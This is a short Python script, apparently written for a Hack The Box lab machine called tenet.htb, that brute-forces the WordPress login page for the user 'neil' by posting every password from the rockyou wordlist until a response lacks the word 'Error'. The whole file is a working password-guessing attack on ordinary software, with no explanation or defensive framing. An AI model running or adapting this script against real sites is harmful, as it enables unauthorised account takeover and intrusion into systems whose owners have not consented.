#!/usr/bin/python3


import requests

with open("/usr/share/wordlists/rockyou.txt", 'r', encoding="ISO-8859-1") as f:
	passwords = f.readlines()

#print(passwords)	
url = "http://tenet.htb/wp-login.php"

print("trying..")
for password in passwords:
	password = password.strip()
	print(password)
	data = {"log" : "neil", "pwd" : f"{password}", "wp-submit" : "Log In"}
	r  = requests.post(url, data = data)

	if("Error" not in r.text):
		print(r.text)
		print(password)
		break
